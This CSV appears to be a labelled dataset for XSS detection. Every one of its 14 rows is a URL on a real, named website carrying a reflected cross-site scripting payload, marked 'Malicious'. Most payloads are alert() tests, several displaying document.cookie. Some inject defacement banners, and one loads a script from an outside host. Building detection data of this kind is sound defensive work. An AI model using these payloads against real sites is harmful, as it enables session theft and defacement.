Payloads,Class
http://pazaryeri.web.tr/search.asp?sh1=%22%3e%3cscript%3ealert(%22jock3r%22)%3c/script%3e,Malicious
http://www.usafa.af.mil/externallinkdisclaimer.cfm?el=&lt;font%20color=red&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;font%20size=7&gt;x<br>sslotion&lt;h1&gt;xssed&lt;/h1&gt;,Malicious
http://www.e-tote.com/bspa/account/index.php?op=register&amp;returl=%2fe-betting%2findex.php%22%3e'%3e%3<br>cscript%3ealert('x')%3c/script%3e,Malicious
http://profiles.camfrog.com/?page=3&amp;r=&amp;cg=4&amp;sn=&amp;srn=&amp;se=&amp;sg=&amp;sa=&amp;sms=&amp;sl=&amp;sou=&amp;sop=&amp;iou=&amp;ioc=&amp;ocp=&amp;s<br>oc=&amp;ads=&amp;sid=&amp;orderby=&amp;st=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.tourismnewwestminster.org/content.php?sectionid=5&amp;contentid=&quot;&gt;&lt;script&gt;alert(document.cook<br>ie)&lt;/script&gt;,Malicious
http://vilniustsv.stat.gov.lt/lt/search/?phpsessid=db5257ed38becc11c3e54f30b944b2c3&amp;query=x%22%3e%27<br>%3e%3cscript%3ealert%28123%29%3c%2fscript%3e%22&amp;x=0&amp;y=0,Malicious
http://www.zdnetindia.com/index.php?action=article&amp;prodid=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;&lt;h1&gt;hacked<br>%20by%20trex&lt;/h1&gt;,Malicious
http://maxhotel-piran.com/gb/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>ackdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.anpe.fr/espacecandidat/nicola/initialiserrecherchepartenaire.do?lieux=75d%2c69d%2c06d%2c1<br>3d%2c34d%2c14d%2c84d%2c77d%2c78d%2c91d%2c92d%2c93d%2c94d%2c95d&amp;mots=%27%22%3e%3c/title%3e%3cscript%3<br>ealert(1337)%3c/script%3e,Malicious
http://www.srh.noaa.gov/zhu/main/tda.php?sid=huf&amp;timeoutput=z%27%22%3e%3c/title%3e%3cscript%3ealert(<br>1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://webofset.net/domain_sonuc.asp?hangisi=%3cscript%3ealert(%22hacked%20by%20st@rext%22)%3c/scrip<br>t%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3ch1%3eby%20st@rext%3c/h1%3e,Malicious
http://interofis.net/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://apure.tsj.gov.ve/noticias/noticia_detallada.asp?id=%22%3e%3cscript%3ealert(/xssed/);%3c/scrip<br>t%3e,Malicious
http://portal.knowledgebase.net/display/1n/search.asp?searchstring='%3e%22%3e%3cscript/src=http://ku<br>somiso.com/xss.js%3e%3c/script%3e,Malicious
